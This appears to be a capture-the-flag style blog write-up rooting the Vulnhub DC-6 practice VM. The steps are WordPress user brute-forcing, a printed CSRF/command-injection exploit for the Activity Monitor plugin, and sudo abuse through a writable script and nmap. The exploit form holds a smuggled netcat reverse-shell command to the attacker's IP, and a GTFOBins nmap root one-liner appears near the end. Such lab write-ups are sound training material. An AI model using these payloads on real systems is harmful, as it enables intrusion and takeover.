---
"title": "Vulnhub - DC 6"
"date": 2019-11-21
"tags": ["easy", "wordpress", "sudo"]
"keywords": ["easy", "wordpress", "sudo"]
"categories": ["Vulnhub"]
"author": "Ghostbyt3"
"description": "Today, We are going to pwn DC 6 by DCAU7 from Vulnhub"
"featured_image": "/img/dc6/1.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "Vulnhub - Writeup"
---


![Untitled](/img/dc6/1.png)[br/](br/)
Today, We are going to pwn DC 6 by DCAU7 from Vulnhub


## Description

>DC-6 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.
This isn't an overly difficult challenge so should be great for beginners.
The ultimate goal of this challenge is to get root and to read the one and only flag.
Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.
For beginners, Google can be of great assistance, but you can always  tweet me at @DCAU7 for assistance to get you going again. But take note:  I won't give you the answer,instead, I'll give you an idea about how  to move forward.

Download Link:[https://www.vulnhub.com/entry/dc-6,315/](https://www.vulnhub.com/entry/dc-6,315/)


Lets Begin with our Initial Scan

## Nmap Scan Results

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)
|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)
|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to http://wordy/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
MAC Address: 08:00:27:45:90:BE (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Looks like there is a HTTP port is open so lets start our Gobuster

## Gobuster Result
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.0.2.11
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/11/28 17:29:09 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/index.php (Status: 200)
/server-status (Status: 403)
/wp-admin (Status: 301)
/wp-includes (Status: 301)
/wp-content (Status: 301)
===============================================================
2019/11/28 17:29:11 Finished
===============================================================
```
Nothing Interesting

![Untitled](/img/dc6/1.png)[br/](br/)
Since it is a wordpress site , Lets run ``Wpscan`` to enumerate any user or find any vulnerable plugins.

![Untitled](/img/dc6/2.png)

We found 5 users 
> admin,jens,graham,mark,sarah
Lets start bruteforcing them.

But the creator give us a hint 
![Untitled](/img/dc6/3.png)

Now we can bruteforce easily![br/](br/)
![Untitled](/img/dc6/4.png)
![Untitled](/img/dc6/5.png)

We got password for mark ``helpdesk01``

## Getting Shell

After Logged in
One thing i observerd is Activity monitor. It looks like a Plugin so it might have an exploit.
![Untitled](/img/dc6/6.png)

>https://www.exploit-db.com/exploits/45274

Yeah Found it!!

First things first, I decided to check the exploit and configure it (if required).

I changed some 
```
1. http://localhost:8000 to http://wordy
2. Removed -lnvp I want to listen on my machine.
```

```
[html](html)
  <!--  Wordpress Plainview Activity Monitor RCE
        [+] Version: 20161228 and possibly prior
        [+] Description: Combine OS Commanding and CSRF to get reverse shell
        [+] Author: LydA(c)ric LEFEBVRE
        [+] CVE-ID: CVE-2018-15877
        [+] Usage: Replace 127.0.0.1 & 9999 with you ip and port to get reverse shell
        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well
  -->
  [body](body)
  [script](script)history.pushState('', '', '/')[/script](/script)
    [form action="http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" method="POST" enctype="multipart/form-data"](form action="http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" method="POST" enctype="multipart/form-data")
      [input type="hidden" name="ip" value="google.fr| nc -e /bin/bash 10.0.2.18 9999" /](input type="hidden" name="ip" value="google.fr| nc -e /bin/bash 10.0.2.18 9999" /)
      [input type="hidden" name="lookup" value="Lookup" /](input type="hidden" name="lookup" value="Lookup" /)
      [input type="submit" value="Submit request" /](input type="submit" value="Submit request" /)
    [/form](/form)
  [/body](/body)
[/html](/html)
```

Saved it and Open that ``.html`` and listening on my machine.
We got the shell


![Untitled](/img/dc6/7.png)


![Untitled](/img/dc6/8.png)

Found ``graham`` password on mark's directory

![Untitled](/img/dc6/9.png)

Logged in as ``graham``

## Privilege Escalation

While enumerating i found a ``backup.sh`` on ``jens`` directory.

But i cant execute it.
I checked ``sudo -l`` on ``graham``

![Untitled](/img/dc6/10.png)

This means we can run with sudo rights, we also have write permission on that file.
So I replaced with giving us shell.

![Untitled](/img/dc6/11.png)

And Run the script
We became ``jens`` now and run ``sudo -l``

![Untitled](/img/dc6/12.png)

It looks like we can run ``nmap`` with sudo rights.

I searched on ``GTFObins``

> [https://gtfobins.github.io/gtfobins/nmap/](https://gtfobins.github.io/gtfobins/nmap/)

```
echo 'os.execute("/bin/sh")' > $TF

nmap --script=$TF
```

We created our nmap script and make it run to give us root.

![Untitled](/img/dc6/13.png)

We got the ``Flag`` and Root !!
